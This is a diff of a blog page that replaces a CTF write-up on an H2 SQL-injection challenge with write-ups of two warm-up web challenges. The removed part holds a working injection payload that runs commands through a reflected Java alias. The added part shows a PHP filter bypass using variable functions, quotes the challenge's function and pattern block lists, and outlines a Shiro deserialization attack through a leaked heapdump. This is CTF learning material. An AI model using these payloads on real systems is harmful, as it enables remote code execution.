@@ -9,7 +9,7 @@
     
     <title>
         
-            N1CTF25-EasyDB |
+            京麒CTF25-热身Web |
         
         1diot9&#39;s Blog
     </title>
@@ -238,7 +238,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        N1CTF25-EasyDB
+                        京麒CTF25-热身Web
                     </div>
                 
 
@@ -266,13 +266,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2025-05-09 19:13:17</span>
+                <span class="datetime">2025-05-22 11:38:10</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Fri May 09 2025 19:14:17 GMT+0800">2025-05-09 19:14:17</span>
+                    <span class="datetime" data-updated="Thu May 22 2025 11:38:50 GMT+0800">2025-05-22 11:38:50</span>
                 </span>
             
         
@@ -302,12 +302,12 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>527 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>814 字</span>
             </span>
         
         
             <span class="meta-info-item post-min2read">
-                <i class="icon fas fa-clock"></i>&nbsp;<span>2 分钟</span>
+                <i class="icon fas fa-clock"></i>&nbsp;<span>4 分钟</span>
             </span>
         
         
@@ -329,26 +329,27 @@
                     
 
                     
-                         <p>记录一下踩坑</p>
-<p>1、executeQuery 可以执行 create</p>
-<p>一开始以为executeQuery 不能执行create 操作。但是后来发现是可以的，只需要在前面加一个select 语句就行。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">CREATE</span> ALIAS RT <span class="keyword">AS</span> 。。。。</span><br></pre></td></tr></table></figure>
+                         <h1 id="Execute"><a href="#Execute" class="headerlink" title="Execute"></a>Execute</h1><p>考命令执行</p>
+<p>先看一下php版本，这里可以直接执行代码：<img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1747883847949-c208a500-98e9-47c9-a98c-9e9dc96d2ccd.png"  alt="img"></p>
+<p>是php7，那么我们知道，这里是支持这种函数执行方式的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
-<p>2、SQL语句中，单引号和双引号的意义不一样</p>
-<p>最后CALL RT(‘calc’);时，一开始用的是双引号，但是双引号会报错：Column “calc” not found; SQL statement:</p>
-<p>CALL RT(“calc”);</p>
-<p>这是因为在 H2 SQL 中，字符串字面量通常使用单引号（’）来包围。双引号（”）在 SQL 中通常用于标识标识符，如表名、列名等。因此，当你在 CALL RT(“calc”) 中使用双引号时，SQL 解释器会将其解释为一个标识符（例如列名），而不是字符串字面量，从而导致错误。</p>
-<p>其他数据库也有这种特性，之后要注意。</p>
-<p>3、h2sql 的注释符只有 – </p>
-<p>一开始用的是#，一直报错。后面查了一下发现没有 #。这点跟mysql 不一样。</p>
-<p>这里主要考察的其实是黑名单绕过，用的是Java的字符串拼接。一开始想到其他编码方式绕过，其实不用这么麻烦。以后应该先考虑这种拼接绕过。</p>
-<p>总结一下，基于字符串的过滤，可以通过：拼接，编码，运算(异或、取反)等方法绕过。</p>
-<p>最终post参数：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa&#x27;;CREATE ALIAS RT AS $$ void rt(String cmd) throws java.lang.Exception &#123;java.lang.Class&lt;?&gt; run = java.lang.Class.forName(&quot;java.lang.Run&quot; + &quot;time&quot;);java.lang.reflect.Method getr = run.getMethod(&quot;getRun&quot;+&quot;time&quot;);java.lang.reflect.Method ex = run.getMethod(&quot;exe&quot; + &quot;c&quot;, String.class);ex.invoke(getr.invoke(null), &quot;calc&quot;);&#125;$$;CALL RT(&#x27;calc&#x27;);--</span><br></pre></td></tr></table></figure>
+<p>试了一下，直接成功了：<img   src="/2025/05/03/JNI/F25-%E7%83%AD%E8%BA%ABWeb/image-1747885110353.png"  alt="img"></p>
+<p>可以看一下题目的过滤逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$max_execution_time</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$memory_limit</span> = <span class="string">&#x27;128M&#x27;</span>;</span><br><span class="line"><span class="variable">$disabled_functions</span> = [</span><br><span class="line">    <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;curl_exec&#x27;</span>, <span class="string">&#x27;curl_multi_exec&#x27;</span>, <span class="string">&#x27;parse_ini_file&#x27;</span>, <span class="string">&#x27;show_source&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pcntl_exec&#x27;</span>, <span class="string">&#x27;posix_kill&#x27;</span>, <span class="string">&#x27;posix_mkfifo&#x27;</span>, <span class="string">&#x27;posix_setpgid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;posix_setsid&#x27;</span>, <span class="string">&#x27;posix_setuid&#x27;</span>, <span class="string">&#x27;posix_setgid&#x27;</span>, <span class="string">&#x27;posix_uname&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;openlog&#x27;</span>, <span class="string">&#x27;syslog&#x27;</span>, <span class="string">&#x27;closelog&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="variable">$max_execution_time</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;memory_limit&#x27;</span>, <span class="variable">$memory_limit</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$code</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;错误: 没有提供PHP代码&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$disabled_functions</span> <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\b&#x27;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="variable">$func</span>, <span class="string">&#x27;/&#x27;</span>) . <span class="string">&#x27;\s*\(/i&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;安全错误: 不允许使用 <span class="subst">&#123;$func&#125;</span>() 函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dangerous_patterns</span> = [</span><br><span class="line">    <span class="string">&#x27;/`.*`/&#x27;</span>,                          <span class="comment">// 反引号执行</span></span><br><span class="line">    <span class="string">&#x27;/eval\s*\(/i&#x27;</span>,                    <span class="comment">// eval函数</span></span><br><span class="line">    <span class="string">&#x27;/create_function\s*\(/i&#x27;</span>,         <span class="comment">// create_function</span></span><br><span class="line">    <span class="string">&#x27;/include\s*\(/i&#x27;</span>,                 <span class="comment">// include</span></span><br><span class="line">    <span class="string">&#x27;/require\s*\(/i&#x27;</span>,                 <span class="comment">// require</span></span><br><span class="line">    <span class="string">&#x27;/include_once\s*\(/i&#x27;</span>,            <span class="comment">// include_once</span></span><br><span class="line">    <span class="string">&#x27;/require_once\s*\(/i&#x27;</span>,            <span class="comment">// require_once</span></span><br><span class="line">    <span class="string">&#x27;/file_put_contents\s*\(/i&#x27;</span>,       <span class="comment">// 文件写入</span></span><br><span class="line">    <span class="string">&#x27;/file_get_contents\s*\(/i&#x27;</span>,       <span class="comment">// 文件读取</span></span><br><span class="line">    <span class="string">&#x27;/unlink\s*\(/i&#x27;</span>,                  <span class="comment">// 文件删除</span></span><br><span class="line">    <span class="string">&#x27;/phpinfo\s*\(/i&#x27;</span>,                 <span class="comment">// phpinfo</span></span><br><span class="line">    <span class="string">&#x27;/chmod\s*\(/i&#x27;</span>,                   <span class="comment">// 修改权限</span></span><br><span class="line">    <span class="string">&#x27;/chown\s*\(/i&#x27;</span>,                   <span class="comment">// 修改所有者</span></span><br><span class="line">    <span class="string">&#x27;/chgrp\s*\(/i&#x27;</span>,                   <span class="comment">// 修改组</span></span><br><span class="line">    <span class="string">&#x27;/putenv\s*\(/i&#x27;</span>,                  <span class="comment">// 环境变量</span></span><br><span class="line">    <span class="string">&#x27;/ini_set\s*\(/i&#x27;</span>,                 <span class="comment">// 修改INI设置</span></span><br><span class="line">    <span class="string">&#x27;/extract\s*\(/i&#x27;</span>,                 <span class="comment">// extract</span></span><br><span class="line">    <span class="string">&#x27;/parse_str\s*\(/i&#x27;</span>,               <span class="comment">// parse_str</span></span><br><span class="line">    <span class="string">&#x27;/assert\s*\(/i&#x27;</span>,                  <span class="comment">// assert</span></span><br><span class="line">    <span class="string">&#x27;/preg_replace\s*\(.*\/e.*\)/i&#x27;</span>,   <span class="comment">// preg_replace /e修饰符</span></span><br><span class="line">    <span class="string">&#x27;/proc_terminate\s*\(/i&#x27;</span>,          <span class="comment">// 进程终止</span></span><br><span class="line">    <span class="string">&#x27;/pcntl_fork\s*\(/i&#x27;</span>,              <span class="comment">// 进程控制</span></span><br><span class="line">    <span class="string">&#x27;/posix_getpwuid\s*\(/i&#x27;</span>,          <span class="comment">// 获取用户信息</span></span><br><span class="line">    <span class="string">&#x27;/posix_kill\s*\(/i&#x27;</span>,              <span class="comment">// 发送信号</span></span><br><span class="line">    <span class="string">&#x27;/posix_setuid\s*\(/i&#x27;</span>,            <span class="comment">// 设置UID</span></span><br><span class="line">    <span class="string">&#x27;/posix_setgid\s*\(/i&#x27;</span>             <span class="comment">// 设置GID</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$dangerous_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;安全错误: 检测到潜在的危险操作&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$old_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$old_display_errors</span> = <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span> . <span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">ParseError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;解析错误: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;位于行: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getLine</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;运行时错误: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;位于行: &quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getLine</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="variable">$old_error_reporting</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="variable">$old_display_errors</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$sensitive_patterns</span> = [</span><br><span class="line">    <span class="string">&#x27;/\/home\/.*/i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/\/var\/www\/.*/i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/\[internal function\]/i&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$sensitive_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="string">&#x27;[隐藏信息]&#x27;</span>, <span class="variable">$output</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$output</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>大概就是通过 ‘system(‘这样的匹配规则来过滤。最底下还会对输出中的敏感目录进行过滤。</p>
+<h1 id="Ezlogin"><a href="#Ezlogin" class="headerlink" title="Ezlogin"></a>Ezlogin</h1><p>可以通过插件或者cookie来判断是一道Java。<img   src="/2025/05/03/JNI/F25-%E7%83%AD%E8%BA%ABWeb/image.png"  alt="img"></p>
+<p>扫一下目录，发现有&#x2F;actuator泄露。简单看一下mapping，env，能发现是一个8u111的环境。</p>
+<p>然后开始用heapdump，先getfile看一下依赖：<img   src="/2025/05/03/JNI/F25-%E7%83%AD%E8%BA%ABWeb/image-1747885110424.png"  alt="img"></p>
+<p>可以看到有shiro和cc3.2.1，下面还有一个cb1.9.4</p>
+<p>查一下shirokey，上面图片最顶上其实已经查了。</p>
+<p>那接下来用java-chain工具一把梭就行。<img   src="/2025/05/03/JNI/F25-%E7%83%AD%E8%BA%ABWeb/image-1747885110342.png"  alt="img"></p>
+<p>记得把GCM模式打开。</p>
+<p>带上cookie，发包即可。不过这里好像对header长度有限制，我生成内存马直接报错了。</p>
+<p>Cookie: rememberMe&#x3D; 6ZAFnvTDGFQNmw2R2x4S8+bF。。。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>题目比较简单，但是题目的环境都挺好的，看着很舒服。</p>
 
-
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=aa%27%3BCREATE%20ALIAS%20RT%20AS%20%24%24%20void%20rt%28String%20cmd%29%20throws%20java.lang.Exception%20%7Bjava.lang.Class%3C%3F%3E%20run%20%3D%20java.lang.Class.forName%28%22java.lang.Run%22%20%2B%20%22time%22%29%3Bjava.lang.reflect.Method%20getr%20%3D%20run.getMethod%28%22getRun%22%2B%22time%22%29%3Bjava.lang.reflect.Method%20ex%20%3D%20run.getMethod%28%22exe%22%20%2B%20%22c%22%2C%20String.class%29%3Bex.invoke%28getr.invoke%28null%29%2C%20%22calc%22%29%3B%7D%24%24%3BCALL%20RT%28%27calc%27%29%3B--&amp;password=123</span><br></pre></td></tr></table></figure>
                     
                 </div>
 
@@ -358,11 +359,11 @@
     <div class="copyright-info-content border-box">
         <div class="copyright-info-top border-box">
             <div class="copyright-post-title border-box text-ellipsis">
-                N1CTF25-EasyDB
+                京麒CTF25-热身Web
             </div>
 
             <div class="copyright-post-link border-box text-ellipsis">
-                2025/05/09/N1CTF25-EasyDB/
+                2025/05/22/京麒CTF25-热身Web/
             </div>
         </div>
 
@@ -378,7 +379,7 @@
                 <div class="type">
                     发布于
                 </div>
-                <div class="content">2025-05-09 19:13</div>
+                <div class="content">2025-05-22 11:38</div>
             </div>
 
 
@@ -430,31 +431,15 @@
                 
                     <div class="post-nav border-box">
                         
-                            <div class="prev-post">
-                                <a class="prev"
-                                   rel="prev"
-                                   href="/2025/05/09/CISCN24-ezjava/"
-                                   title="CISCN24_ezjava"
-                                >
-                                    <span class="left arrow-icon flex-center">
-                                        <i class="fas fa-chevron-left"></i>
-                                    </span>
-                                    <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">CISCN24_ezjava</span>
-                                        <span class="post-nav-item">上一篇</span>
-                                    </span>
-                                </a>
-                            </div>
-                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2025/05/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B%E5%88%9D%E8%B5%9B25-JDBCParty/"
-                                   title="软件安全赛初赛25--JDBCParty"
+                                   href="/2025/05/09/MRCTF22-Springcoffee/"
+                                   title="MRCTF22 Springcoffee"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">软件安全赛初赛25--JDBCParty</span>
+                                        <span class="post-nav-title-item text-ellipsis">MRCTF22 Springcoffee</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -482,7 +467,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Execute"><span class="nav-number">1.</span> <span class="nav-text">Execute</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ezlogin"><span class="nav-number">2.</span> <span class="nav-text">Ezlogin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
@@ -672,7 +657,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Execute"><span class="nav-number">1.</span> <span class="nav-text">Execute</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ezlogin"><span class="nav-number">2.</span> <span class="nav-text">Ezlogin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol>
     </div>
 </div>
 
